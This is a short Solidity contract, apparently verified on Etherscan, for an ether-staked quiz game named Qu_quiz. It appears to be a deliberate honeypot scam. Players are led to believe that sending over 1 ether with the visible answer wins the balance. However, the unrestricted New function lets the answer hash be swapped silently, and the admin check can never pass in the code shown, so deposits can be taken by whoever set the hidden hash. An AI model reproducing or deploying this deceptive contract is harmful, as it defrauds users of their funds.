/**
 *Submitted for verification at Etherscan.io on 2020-03-01
*/

contract Qu_quiz
{
    event LOGXD(address playerAddress);
    function Try(string _response) external  payable
    {
        LOGXD(tx.origin);
        require(msg.sender == tx.origin);

        if(responseHash == keccak256(_response) && msg.value > 1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }

    string public question;

    bytes32 responseHash;

    mapping (bytes32=>bool) admin;

    function Start(string _question, string _response) public payable {
        if(responseHash==0x0){
            responseHash = keccak256(_response);
            question = _question;
        }
    }

    function Stop() public payable isAdmin {
        msg.sender.transfer(this.balance);
    }

    function New(string _question, bytes32 _responseHash) public payable {
        question = _question;
        responseHash = _responseHash;
    }

    constructor() public{
    }

    modifier isAdmin(){
        require(admin[keccak256(msg.sender)]);
        _;
    }

    function() public payable{}
}